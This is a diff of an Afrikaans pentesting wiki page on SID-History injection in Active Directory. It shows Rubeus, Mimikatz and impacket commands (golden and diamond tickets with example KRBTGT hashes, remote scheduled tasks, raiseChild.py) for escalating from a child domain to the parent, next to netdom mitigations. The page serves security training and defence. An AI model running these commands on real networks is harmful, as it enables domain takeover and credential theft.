@@ -1,34 +1,34 @@
-# SID-History Inspuiting
+# SID-History Injection
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## SID History Inspuiting Aanval
+## SID History Injection Attack
 
-Die fokus van die **SID History Inspuiting Aanval** is om **gebruikermigrasie tussen domeine** te ondersteun terwyl toegang tot hulpbronne van die vorige domein verseker word. Dit word bereik deur **die gebruiker se vorige Veiligheidsidentifiseerder (SID) in die SID Geskiedenis** van hul nuwe rekening in te sluit. Dit is belangrik om te noem dat hierdie proses gemanipuleer kan word om ongeoorloofde toegang te verleen deur die SID van 'n hoë-privilege groep (soos Enterprise Admins of Domain Admins) van die ouerdomein by die SID Geskiedenis te voeg. Hierdie uitbuiting bied toegang tot alle hulpbronne binne die ouerdomein.
+Die fokus van die **SID History Injection Attack** is om **user migration between domains** te ondersteun, terwyl voortgesette toegang tot hulpbronne van die voormalige domain verseker word. Dit word bereik deur die gebruiker se vorige Security Identifier (SID) by die SID History van hul nuwe rekening in te sluit. Hierdie proses kan egter gemanipuleer word om unauthorized access toe te staan deur die SID van ’n groep met hoë privileges (soos Enterprise Admins of Domain Admins) van die parent domain by die SID History te voeg. Hierdie uitbuiting verleen toegang tot alle hulpbronne binne die parent domain.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Twee metodes bestaan om hierdie aanval uit te voer: deur die skep van 'n **Golden Ticket** of 'n **Diamond Ticket**.
+Twee metodes bestaan om hierdie aanval uit te voer: deur óf ’n **Golden Ticket** óf ’n **Diamond Ticket** te skep.
 
-Om die SID vir die **"Enterprise Admins"** groep te bepaal, moet 'n mens eers die SID van die worteldomein vind. Na identifikasie kan die Enterprise Admins groep SID saamgestel word deur `-519` by die worteldomein se SID te voeg. Byvoorbeeld, as die worteldomein SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins" groep `S-1-5-21-280534878-1496970234-700767426-519` wees.
+Om die SID vir die **"Enterprise Admins"**-groep te bepaal, moet ’n mens eers die SID van die root domain vind. Nadat dit geïdentifiseer is, kan die Enterprise Admins-groep se SID saamgestel word deur `-519` by die root domain se SID te voeg. Byvoorbeeld, indien die root domain se SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins"-groep `S-1-5-21-280534878-1496970234-700767426-519` wees.<sup>[[1]](#references)</sup>
 
-Jy kan ook die **Domain Admins** groepe gebruik, wat eindig op **512**.
+Jy kan ook die **Domain Admins**-groepe gebruik, wat op **512** eindig.
 
-'n Ander manier om die SID van 'n groep van die ander domein (byvoorbeeld "Domain Admins") te vind, is met:
+Nog ’n manier om die SID van ’n groep in die ander domain (byvoorbeeld "Domain Admins") te vind, is met:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Let daarop dat dit moontlik is om SID-geskiedenis in 'n vertrouensverhouding te deaktiveer, wat hierdie aanval sal laat misluk.
+> Let daarop dat dit moontlik is om SID history in ’n trust relationship te deaktiveer, wat sal veroorsaak dat hierdie aanval misluk.
 
-Volgens die [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
-- **Deaktiveer SIDHistory op woudvertroue** met die netdom-tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Pas SID Filter Quarantining toe op eksterne vertroue** met die netdom-tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Pas SID Filtering toe op domeinvertroue binne 'n enkele woud** word nie aanbeveel nie, aangesien dit 'n onondersteunde konfigurasie is en breekveranderinge kan veroorsaak. As 'n domein binne 'n woud onbetroubaar is, moet dit nie 'n lid van die woud wees nie. In hierdie situasie is dit nodig om eers die vertroude en onbetroubare domeine in aparte woude te verdeel waar SID Filtering op 'n interwoudvertroue toegepas kan word.
+Volgens die [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
+- **Deaktiveer SIDHistory op forest trusts** deur die netdom-tool te gebruik (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Pas SID Filter Quarantining op external trusts toe** deur die netdom-tool te gebruik (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Die toepassing van SID Filtering op domain trusts binne ’n enkele forest** word nie aanbeveel nie, aangesien dit ’n nie-ondersteunde konfigurasie is en breaking changes kan veroorsaak. As ’n domain binne ’n forest onbetroubaar is, behoort dit nie ’n lid van die forest te wees nie. In hierdie situasie is dit eers nodig om die trusted en untrusted domains in afsonderlike forests te verdeel, waar SID Filtering op ’n interforest trust toegepas kan word.
 
-Kyk na hierdie pos vir meer inligting oor om dit te omseil: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Lees hierdie post vir meer inligting oor hoe om dit te omseil: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Laas keer toe ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
+Die laaste keer toe ek dit probeer het, moes ek die arg **`/ldap`** byvoeg.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Goue Kaart (Mimikatz) met KRBTGT-AES256
+### Golden Ticket (Mimikatz) met KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -61,7 +61,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Vir meer inligting oor goue kaartjies, kyk:
+Vir meer inligting oor golden tickets, kyk na:
 
 
 {{#ref}}
@@ -69,7 +69,7 @@ golden-ticket.md
 {{#endref}}
 
 
-Vir meer inligting oor diamant kaartjies, kyk:
+Vir meer inligting oor diamond tickets, kyk na:
 
 
 {{#ref}}
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Verhoog na DA van wortel of Enterprise admin deur die KRBTGT-hash van die gecompromitteerde domein:
+Eskaleer na DA van root of Enterprise admin deur die KRBTGT-hash van die gekompromitteerde domein te gebruik:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,13 +92,14 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Met die verkregen toestemmings van die aanval kan jy byvoorbeeld 'n DCSync-aanval in die nuwe domein uitvoer:
+Met die verkrygde toestemmings van die aanval kan jy byvoorbeeld ’n DCSync-aanval in die nuwe domein uitvoer:
+
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### Van linux
+### Vanaf Linux
 
 #### Handmatig met [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
@@ -120,27 +121,28 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Outomaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Outomaties met behulp van [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Dit is 'n Impacket-skrip wat **outomaties die opgradering van kind- na ouer-domein** sal uitvoer. Die skrip benodig:
+Dit is 'n Impacket-script wat **die eskalering van die kinderdomein na die ouerdomein outomatiseer**. Die script benodig:
 
 - Teikendomeinbeheerder
-- Kredensies vir 'n admin gebruiker in die kinddomein
+- Creds vir 'n admin-gebruiker in die kinderdomein
 
-Die vloei is:
+Die proses is:
 
 - Verkry die SID vir die Enterprise Admins-groep van die ouerdomein
-- Verkry die hash vir die KRBTGT-rekening in die kinddomein
-- Skep 'n Goue Teken
+- Haal die hash vir die KRBTGT-rekening in die kinderdomein op
+- Skep 'n Golden Ticket
 - Meld aan by die ouerdomein
-- Verkry kredensies vir die Administrateurrekening in die ouerdomein
-- As die `target-exec` skakel gespesifiseer is, verifieer dit by die ouerdomein se Domeinbeheerder via Psexec.
+- Haal credentials vir die Administrator-rekening in die ouerdomein op
+- Indien die `target-exec`-skakelaar gespesifiseer word, autentiseer dit teen die ouerdomein se Domain Controller via Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Verwysings
 
-- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
-- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
 
 {{#include ../../banners/hacktricks-training.md}}
